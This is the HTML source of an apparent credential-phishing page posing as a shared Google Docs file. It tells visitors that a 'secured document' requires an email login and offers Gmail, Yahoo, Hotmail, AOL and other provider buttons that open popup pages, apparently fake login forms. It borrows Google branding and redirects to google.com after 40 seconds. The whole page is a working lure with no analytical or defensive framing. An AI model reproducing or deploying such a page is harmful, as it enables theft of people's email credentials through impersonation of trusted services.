<html><head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Document Shared</title>
<meta name="GENERATOR"/>
<meta name="HOSTING"/>
<link href="index_files/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
<style type="text/css">
div#container
{
   width: 1304px;
   position: relative;
   margin-top: 0px;
   margin-left: auto;
   margin-right: auto;
   text-align: left;
}
</style>
<style type="text/css">
body
{
   text-align: center;
   margin: 0;
   background-color: #FFFFFF;
   color: #000000;
}
#backgroundimage
{
   height: auto;
   left: 0;
   margin: 0;
   min-height: 100%;
   min-width: 1304px;
   padding: 0;
   position: fixed;
   top: 0;
   width: 100%;
   z-index: -1;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	font-weight: bold;
}
.style2 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; font-weight: bold; }
</style>
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
<meta content="40;URL=http://google.com" http-equiv="refresh"/>
</head><body><center>
<p> </p>
<p><img height="60" src="index_files/logo_2x.png" width="160"/>
</p>
<p class="style1">  </p>
<p>To view this secured document, you are required to login with your e-mail address below: </p>
<table align="center" cellpadding="10" cellspacing="3" id="wrapper">
<tbody>
<tr>
<td>
<center>
<img height="128" src="index_files/avatar_2x.png" width="321"/>
<p class="style2">  </p>
<p>Choose your email provider below and login: </p>
<p class="style2"> </p>
</center>
<table width="100%">
<tbody>
<tr>
<td width="100%"></td>
</tr>
</tbody>
</table>
<table cellspacing="0" id="invoicetoptables" width="100%">
<tbody>
<tr>
<td id="invoicecontent" width="50%">
<table cellpadding="10" cellspacing="0" height="100" id="invoicetoptables" width="100%">
<tbody>
<tr>
<td id="invoicecontent" valign="top">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tr>
<td><a href="javascript:popupwnd('gmail.htm','no','no','no','no','no','no','900','100','400','400')" target="_self"><img alt="Gmail" border="0" height="48" id="displayTextgmail" src="index_files/gmail.jpg" title="Gmail" width="132"/></a></td>
<td> </td>
<td><a href="javascript:popupwnd('yahoo.htm','no','no','no','no','no','no','900','100','400','400')" target="_self"><img alt="Yahoo!" border="0" height="48" id="displayText" src="index_files/yahoo.jpg" title="Yahoomail" width="132"/></a></td>
</tr>
</table>
<p align="center"> </p>
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tr>
<td height="65"><a href="javascript:popupwnd('live.htm','no','no','no','no','no','no','900','100','400','400')" target="_self"><img alt="Hotmail" border="0" height="35" id="displayTexthotmail" name="displayTexthotmail" src="index_files/hotmail.jpg" title="Hotmail" width="132"/></a></td>
<td> </td>
<td><a href="javascript:popupwnd('aol.htm','no','no','no','no','no','no','900','100','400','400')" target="_self"><img alt="AOL" border="0" height="40" id="displayTextaol" name="displayTextaol" src="index_files/aol.jpg" title="Aol" width="132"/></a></td>
</tr>
</table>
<p align="center"> <br/>
<br/>
<a href="javascript:popupwnd('other.htm','no','no','no','no','no','no','900','100','400','400')" target="_self"><img border="0" height="26" id="displayTextother" name="displayTextother" src="index_files/other.jpg" title="Other Email" width="184"/></a></p></td>
</tr>
</tbody>
</table> </td>
</tr>
</tbody>
</table> </td>
</tr>
</tbody>
</table>
<center>
<p>Google Docs makes it easy to create, store and share online documents, spreadsheets and presentations.</p>
<p><br/>
<img height="19" src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" width="230"/> </p>
</center>
</center></body></html>